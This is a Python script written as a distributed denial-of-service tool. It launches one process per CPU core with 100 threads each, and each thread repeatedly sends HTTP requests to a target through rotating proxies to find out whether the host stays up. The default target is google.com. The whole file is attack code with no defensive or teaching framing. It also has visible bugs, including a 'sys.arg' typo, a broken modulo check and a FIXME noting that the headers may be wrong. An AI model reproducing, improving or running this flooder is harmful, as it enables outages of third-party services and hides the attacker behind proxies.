import requests
import sys
from multiprocessing import Process, Queue, cpu_count
from threading import Thread
from proxy_manager import ProxyManager
import socket
import time

MAX_THREADS = 100


def spin_threads(target_ip, port, proxy_queue, abort_queue):
    print('spinning threads')
    threads = [None for i in range(MAX_THREADS)]
    for i in range(MAX_THREADS):
        threads[i] = Thread(target = ddos_worker, args = (target_ip, port, proxy_queue))
        threads[i].start()
    try:
        e = abort_queue.get_nowait()
        print('aborting')
        return
    except:
        pass


def ddos_worker(target, port, proxy_queue):
    times = []
    
    #FIXME: maybe the headers are broken or something
    headers = ("GET %s HTTP/1.1" % target) + ("\r\nHost: %s\r\n\r\n" % target)
    while 1:
        proxy_host, proxy_port = proxy_queue.get().split(':')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    
        try:
            s.connect((proxy_host, int(proxy_port)))
            s.send(headers.encode('utf-8'))
            start_t = time.time()
            response = s.recv(3000)
            elapsed = time.time() - start_t
            if response:
                times.append(elapsed)
            else:
                print("did not return 200 OK, Server may be down, exiting...")
                times.append(-1)
                return times
        except socket.error as m:
            if type(m).__name__ == 'TimeoutError':
                print('TimeoutError, likely a proxy failure')
            else:
                print(str(m))
    
        finally:
            s.close()

        
        if (len(times) + 1 % 25 == 0):
            print('made 25 requests, host still up')


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) - 1 > 0 else 'https://www.google.com'
    port = sys.arg[2] if len(sys.argv) - 1 > 1 else 443

    proxy_queue = Queue()
    abort_q = Queue()

    pman = ProxyManager()
    print('filling proxy stack')
    pman.fill_proxy_stack()
    while not pman.proxy_stack:
        pass

    num_processes = cpu_count()
    processes = []
    print('spinning processes')
    for i in range(num_processes):
        processes.append(Process(target=spin_threads, args=(
            target, port, proxy_queue, abort_q)))
        processes[i].start()

    try:
        while True:
            sys.stdout.flush()
            if proxy_queue.qsize() < num_processes:
                proxy_queue.put(pman.request_new_proxy())
    except KeyboardInterrupt:
        print('exiting')
        for i in range(len(processes)):
            abort_q.put('exit')
        for p in processes:
            p.join()
        exit()
